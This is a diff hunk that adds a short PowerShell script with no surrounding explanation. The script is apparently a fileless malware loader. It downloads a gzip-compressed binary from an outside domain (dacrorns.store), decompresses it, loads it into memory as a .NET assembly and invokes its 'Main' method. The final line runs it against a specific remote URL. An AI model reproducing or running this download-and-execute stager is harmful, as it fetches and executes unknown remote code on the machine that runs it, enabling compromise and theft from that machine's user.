@@ -1,0 +1,14 @@
+Function Load { param([Parameter(Mandatory = $True)] [String]$URI);function GzExtract {[CmdletBinding()] Param ([Parameter(Position = 0, Mandatory = $True)] [byte[]] $byteArray = $(Throw("-byteArray is required")) ); Process { $input = New-Object System.IO.MemoryStream(, $byteArray );$output = New-Object System.IO.MemoryStream;$gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress);$gzipStream.CopyTo( $output );$gzipStream.Close();$input.Close();[byte[]] $byteOutArray = $output.ToArray();return $byteOutArray;}}
+ Add-type -Assembly System.Drawing;
+ Add-Type -Assembly System.Windows.Forms;Add-Type -Assembly PresentationCore;
+ Add-Type -AssemblyName System.Windows.Forms;
+ Add-type -AssemblyName System.Drawing;
+ [byte[]]$bytes = (wget $URI).content;
+ $length = $bytes.Length;[byte[]]$exBytes = GzExtract ($bytes);
+ $length = $exBytes.Length;
+ $assembly = [System.Reflection.Assembly]::Load($exBytes);
+ $name = "Main";
+ foreach ($type in $assembly.GetTypes()){
+ foreach ($method in $type.GetMethods()){if (($method.Name.ToLower()).equals($name.ToLower())){
+ $method.Invoke($null, @());}}}}
+  Load -URI "https://dacrorns.store/lnk/rc.bin"
